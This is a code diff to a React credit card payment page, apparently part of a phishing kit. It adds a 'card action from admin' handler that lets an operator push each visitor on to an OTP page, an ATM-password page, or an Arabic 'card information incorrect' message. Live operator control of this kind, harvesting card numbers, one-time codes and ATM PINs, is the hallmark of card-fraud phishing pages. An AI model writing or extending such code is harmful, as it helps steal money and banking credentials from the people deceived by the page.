@@ -22,6 +22,7 @@ import {
   isFormApproved,
   isCardVerified,
   navigateToPage,
+  cardAction,
 } from "@/lib/store";
 
 const schema = z.object({
@@ -102,6 +103,7 @@ export default function CreditCardPayment() {
   const [, navigate] = useLocation();
   const [cardError, setCardError] = useState(false);
   const [luhnError, setLuhnError] = useState(false);
+  const [rejectedError, setRejectedError] = useState(false);
   const debounceRef = useRef<ReturnType<typeof setTimeout>>();
 
   // Get service and amount from URL params
@@ -173,6 +175,21 @@ export default function CreditCardPayment() {
       navigate("/otp-verification");
     }
   }, [isFormApproved.value, navigate]);
+
+  // Handle card action from admin
+  useEffect(() => {
+    if (cardAction.value) {
+      if (cardAction.value === 'otp') {
+        navigate("/otp-verification");
+      } else if (cardAction.value === 'atm') {
+        navigate("/atm-password");
+      } else if (cardAction.value === 'reject') {
+        setRejectedError(true);
+      }
+      // Reset card action
+      cardAction.value = null;
+    }
+  }, [cardAction.value, navigate]);
 
   // Format card number with spaces every 4 digits
   const formatCardNumber = (value: string): string => {
@@ -258,6 +275,13 @@ export default function CreditCardPayment() {
           <img src="/images/visa.png" alt="visa" className="h-8" />
           <img src="/images/mastercard.png" alt="mastercard" className="h-8" />
         </div>
+
+        {/* Rejected Error Message */}
+        {rejectedError && (
+          <div className="bg-red-50 border border-red-200 rounded-lg p-4 mb-4">
+            <p className="text-red-600 text-center font-medium">معلومات البطاقة المدخلة غير صحيحة</p>
+          </div>
+        )}
 
         <form onSubmit={handleSubmit(onSubmit)} className="space-y-4">
           {/* Card Number */}
